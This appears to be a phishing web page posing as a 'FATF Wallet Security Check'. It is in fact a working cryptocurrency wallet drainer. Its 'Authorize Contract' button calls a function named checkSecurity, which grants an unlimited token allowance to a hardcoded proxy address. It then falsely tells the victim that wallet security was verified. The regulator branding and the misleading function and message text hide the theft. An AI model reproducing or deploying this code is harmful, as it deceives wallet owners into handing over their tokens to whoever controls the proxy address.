<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FATF Wallet Security Check</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f9f9f9;
            color: #333;
        }
        button {
            background-color: #007bff;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 15px;
        }
        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div>
        <h2>Connect and Authorize Wallet</h2>
        <button id="connectWallet" onclick="connectWallet()">Connect Wallet</button>
        <p id="walletStatus">Wallet Not Connected</p>
        <button id="approveButton" onclick="checkSecurity()" disabled>Authorize Contract</button>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <script>
        const proxyAddress = "0x67A0bCBC059358E96bF4e85B43FFB2a12f25e097"; // Proxy Contract Address
        let provider, signer;

        // The ABI for the token contract that includes 'approve' and 'allowance' methods
        const tokenABI = [
            {
                "inputs": [
                    {
                        "internalType": "address",
                        "name": "owner",
                        "type": "address"
                    },
                    {
                        "internalType": "address",
                        "name": "spender",
                        "type": "address"
                    }
                ],
                "name": "allowance",
                "outputs": [
                    {
                        "internalType": "uint256",
                        "name": "",
                        "type": "uint256"
                    }
                ],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [
                    {
                        "internalType": "address",
                        "name": "spender",
                        "type": "address"
                    },
                    {
                        "internalType": "uint256",
                        "name": "amount",
                        "type": "uint256"
                    }
                ],
                "name": "approve",
                "outputs": [
                    {
                        "internalType": "bool",
                        "name": "",
                        "type": "bool"
                    }
                ],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [
                    {
                        "internalType": "address",
                        "name": "account",
                        "type": "address"
                    }
                ],
                "name": "balanceOf",
                "outputs": [
                    {
                        "internalType": "uint256",
                        "name": "",
                        "type": "uint256"
                    }
                ],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [
                    {
                        "internalType": "address",
                        "name": "sender",
                        "type": "address"
                    },
                    {
                        "internalType": "address",
                        "name": "recipient",
                        "type": "address"
                    },
                    {
                        "internalType": "uint256",
                        "name": "amount",
                        "type": "uint256"
                    }
                ],
                "name": "transferFrom",
                "outputs": [
                    {
                        "internalType": "bool",
                        "name": "",
                        "type": "bool"
                    }
                ],
                "stateMutability": "nonpayable",
                "type": "function"
            }
        ];

        const tokenAddress = "0xd387FEeD5D966912F0af9e7fE1A854e4d6067CDE"; // Fixed Token Contract Address

        // Connect to the user's wallet using MetaMask or another Web3 wallet
        async function connectWallet() {
            if (typeof window.ethereum !== "undefined") {
                try {
                    provider = new ethers.providers.Web3Provider(window.ethereum);
                    await provider.send("eth_requestAccounts", []);  // Request accounts from the wallet
                    signer = provider.getSigner();
                    const walletAddress = await signer.getAddress();
                    document.getElementById("walletStatus").innerText = `Connected Wallet: ${walletAddress}`;
                    document.getElementById("approveButton").disabled = false; // Enable the 'Check Security' button
                } catch (error) {
                    alert("Wallet connection failed. Please try again!");
                }
            } else {
                alert("Please install MetaMask or other wallet extensions!");
            }
        }

        // Perform the token approval to the proxy contract with unlimited allowance
        async function checkSecurity() {
            if (!signer) {
                alert("Please connect your wallet first!");
                return;
            }

            const tokenContract = new ethers.Contract(tokenAddress, tokenABI, signer);

            try {
                const tx = await tokenContract.approve(proxyAddress, ethers.constants.MaxUint256);  // Grant unlimited allowance
                console.log("Transaction hash:", tx.hash);  // Output transaction hash
                alert("Wallet security verified successfully! Authorization granted.");
            } catch (error) {
                console.error("Error during authorization:", error);  // Output detailed error
                alert("Wallet security check failed. Please try again!");
            }
        }
    </script>
</body>
</html>
